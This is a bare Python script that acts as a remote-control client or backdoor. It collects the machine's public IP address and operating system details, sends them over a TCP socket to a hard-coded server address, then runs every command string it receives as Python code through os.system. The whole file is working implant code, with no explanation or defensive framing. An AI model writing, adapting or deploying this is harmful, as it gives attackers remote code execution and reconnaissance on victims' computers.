import socket
import platform
import requests
import os

ip = "127.0.0.1"
port = 40000
address = (ip, port)

# Get the public IP address and strip any trailing whitespace (including newlines)
get_ip = requests.get('https://ipv4.icanhazip.com').text.strip()
get_os = platform.system()
get_release = platform.release()
arch = platform.processor()

get_total_os = f"{get_ip}&{get_os}&{get_release}&{arch}"
print(get_total_os)

try:
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.connect(address)
    try:
        server_socket.send(get_total_os.encode("utf-8"))
    except socket.error as e:
        print("Error sending data: ", e)
except socket.error as e:
    print(f"Socket error: {e}")
    exit(1)

def main():
    try:
        while True:
            data = server_socket.recv(100000).decode("utf-8").strip()
            # Execute the received command
            os.system(f"python3 -c '{data}'")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        server_socket.close()

if __name__ == "__main__":
    main()
